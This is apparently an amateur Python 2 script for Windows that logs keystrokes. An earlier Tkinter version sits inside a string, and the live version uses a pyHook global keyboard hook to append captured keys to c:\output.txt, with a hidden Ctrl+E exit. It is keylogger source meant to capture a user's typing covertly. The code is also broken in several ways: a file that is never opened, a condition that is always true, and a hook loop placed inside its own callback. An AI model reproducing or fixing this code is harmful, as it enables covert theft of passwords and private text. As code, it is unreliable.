'''import Tkinter as tk
myfile=("C:\Users\Annakoppad\Desktop\pythonprograms\text.txt", "w")
def keypress(event):
    if event.keysym == 'Escape':
        main.destroy()
    keyPressed = event.char
    myfile.write(keyPressed)

main = tk.Tk()
print "Press any key (Escape key to exit):"
main.bind_all('<Key>', keypress)
main.withdraw()
main.mainloop()
myfile.close()
'''
import win32api 
import sys
import pythoncom, pyHook 
buffer = ''

def OnKeyboardEvent(event):
    if event.Ascii == 5: 
        sys.exit() 

    if event.Ascii != 0 or 8: 
        f = open ('c:\\output.txt', 'a') 
        keylogs = chr(event.Ascii) 
        if event.Ascii == 13: 
            keylogs = keylogs + '\n' 
            f.write(keylogs) 
        f.close() 

    while True:
        hm = pyHook.HookManager() 
        hm.KeyDown = OnKeyboardEvent 
        hm.HookKeyboard() 
        pythoncom.PumpMessages()
